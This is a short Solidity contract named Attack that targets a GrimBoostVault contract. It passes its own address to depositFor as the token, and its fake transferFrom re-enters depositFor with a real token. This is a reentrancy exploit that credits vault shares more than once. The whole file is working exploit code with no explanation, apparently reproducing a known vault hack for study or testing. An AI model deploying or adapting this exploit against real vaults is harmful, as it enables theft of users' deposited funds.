// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "./GrimBoostVault.sol";
import "./dependencies/IERC20.sol";

contract Attack {
    address public token;
    address public vault;

    constructor(address _token, address _vault) public {
        token = _token;
        vault = _vault;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) public {
        IERC20(token).approve(vault, _amount);
        GrimBoostVault(vault).depositFor(token, _amount, address(this));
    }

    function start(uint256 _amount) public {
        GrimBoostVault(vault).depositFor(address(this), _amount, address(this));
    }
}
